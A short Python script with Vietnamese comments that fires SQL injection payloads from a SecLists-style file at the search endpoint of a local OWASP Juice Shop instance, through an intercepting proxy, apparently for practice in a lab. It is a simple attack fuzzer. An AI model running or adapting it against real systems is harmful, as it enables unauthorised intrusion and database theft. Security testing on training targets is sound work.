import requests

TARGET_URL = "http://localhost:3000/rest/products/search" # Ví dụ Juice Shop
PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
PAYLOAD_FILE = "sqli_payloads.txt" # Lấy từ Seclists

def generate_attack():
    with open(PAYLOAD_FILE, "r") as f:
        for payload in f:
            payload = payload.strip()
            # Bơm payload vào query params hoặc body
            params = {"q": payload}
            try:
                requests.get(TARGET_URL, params=params, proxies=PROXY)
                print(f"Sent: {payload}")
            except:
                pass

if __name__ == "__main__":
    generate_attack()